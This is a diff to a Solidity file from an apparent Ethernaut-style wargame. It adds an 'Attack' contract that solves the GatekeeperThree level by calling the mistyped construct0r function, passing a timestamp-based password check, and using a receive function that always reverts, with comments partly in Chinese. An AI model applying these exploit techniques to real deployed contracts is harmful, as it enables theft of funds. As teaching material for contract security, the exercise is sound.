@@ -29,6 +29,10 @@ contract SimpleTrick {
     }
 }
 
+/**
+ * 初始化后，owner、entrant、trick均为空
+ * 
+ */
 contract GatekeeperThree {
     address public owner;
     address public entrant;
@@ -76,4 +80,22 @@ contract GatekeeperThree {
     }
 
     receive() external payable {}
+}
+
+contract Attack {
+    receive() external payable {
+        require(0 == 1);
+    }
+
+    function attack(GatekeeperThree addr) public {
+        // gateOne
+        addr.construct0r();
+
+        // gateTwo
+        addr.createTrick();
+        addr.getAllowance(block.timestamp);
+
+        // gateThree 先转账0.0011eth给合约
+        addr.enter();
+    }
 }
